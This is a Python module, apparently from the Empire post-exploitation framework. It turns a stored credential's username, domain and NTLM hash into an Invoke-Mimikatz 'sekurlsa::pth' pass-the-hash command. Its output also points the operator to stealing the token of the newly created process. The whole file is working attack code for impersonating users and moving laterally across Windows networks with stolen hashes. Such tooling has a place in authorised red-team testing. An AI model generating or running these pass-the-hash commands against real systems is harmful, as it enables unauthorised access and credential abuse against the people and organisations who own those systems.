import logging

from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

log = logging.getLogger(__name__)


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    raise ModuleValidationException("CredID is invalid!")

                if cred.credtype != "hash":
                    raise ModuleValidationException("An NTLM hash must be used!")

                if cred.username != "":
                    params["user"] = cred.username
                if cred.domain != "":
                    params["domain"] = cred.domain
                if cred.password != "":
                    params["ntlm"] = cred.password

        if params["ntlm"] == "":
            log.error("ntlm hash not specified")

        # build the custom command with whatever options we want
        command = "sekurlsa::pth /user:" + params["user"]
        command += " /domain:" + params["domain"]
        command += " /ntlm:" + params["ntlm"]

        # base64 encode the command to pass to Invoke-Mimikatz
        script_end = "Invoke-Mimikatz -Command '\"" + command + "\"'"

        script_end += (
            ';"`nUse credentials/token to steal the token of the created PID."'
        )

        return script, script_end
